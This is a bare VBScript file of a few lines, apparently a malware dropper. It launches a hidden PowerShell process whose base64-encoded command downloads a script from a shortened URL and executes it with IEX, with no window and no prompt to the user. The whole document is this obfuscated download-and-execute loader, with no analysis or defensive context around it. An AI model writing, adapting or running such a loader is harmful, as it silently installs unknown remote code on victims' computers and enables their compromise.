Dim objShell
Set objShell = WScript.CreateObject( "WScript.Shell" )
command = "powershell -W hidden -nop  -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgB1AHIALgBsAHkALwBhAG4AMgBlACcAKQA=" 
objShell.Run command,0
Set objShell = Nothing
